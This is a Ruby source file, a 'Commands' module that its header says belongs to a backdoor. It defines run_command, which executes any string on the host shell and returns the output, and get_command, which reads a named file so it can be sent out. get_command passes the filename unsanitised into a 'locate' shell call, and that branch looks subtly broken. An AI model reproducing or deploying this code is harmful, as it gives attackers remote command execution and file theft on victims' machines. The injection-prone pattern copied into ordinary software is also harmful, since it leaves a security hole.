#!/usr/bin/env ruby

#-------------------------------------------------------------------------------
# Commands
#
# Author: Karl Castillo
# Date: November 20, 2012
#
# Notes:
# Commands suite and helper comands for the backdoor.
#-------------------------------------------------------------------------------
module Commands
    #---------------------------------------------------------------------------
    # run_command
    #
    # Author: Karl Castillo
    # Date: November 20, 2012
    #
    # Notes:
    # Runs the command on the shell
    #---------------------------------------------------------------------------
    def run_command(cmd)
        begin
            return `#{cmd}`
        rescue Exception => e
            return e.to_s
        end # rescue
    end
    
    #---------------------------------------------------------------------------
    # listen
    #
    # Author: Karl Castillo
    # Date: November 20, 2012
    #
    # Notes:
    # Open and read the file that will be sent.
    #---------------------------------------------------------------------------
    def get_command(args, filename)
        if args == "locate" then
            name = `locate -n 1 #{filename}`
            if name.empty? then
                return "File: #{filename} does not exist."
            else
                if File.readable?(name) then
                    file = File.open(name, "rb")
                    return file.read
                else
                    "File: #{filename} not readable."
                end
            end
        else
            if !File.exist?(filename) then
                return "File: #{filename} does not exist."
            end
            if File.readable?(filename) then
                file = File.open(filename, "rb")
                return file.read
            else
                "File: #{filename} not readable."
            end
        end
    end
end
